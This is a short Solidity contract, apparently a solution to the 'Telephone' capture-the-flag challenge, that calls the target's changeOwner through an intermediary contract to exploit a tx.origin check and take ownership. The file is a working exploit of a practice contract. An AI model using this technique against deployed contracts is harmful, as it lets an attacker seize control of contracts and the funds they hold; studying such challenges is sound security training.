// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Telephone.sol";
import "forge-std/console.sol";

contract TelephoneSolver {

  Telephone telephoneInstance;
  address owner;

  constructor(address _telephoneInstance) {
    telephoneInstance = Telephone(_telephoneInstance);
    owner = msg.sender;
  }

  function passPhone() public {
    console.log(owner);
    telephoneInstance.changeOwner(owner);
  }
}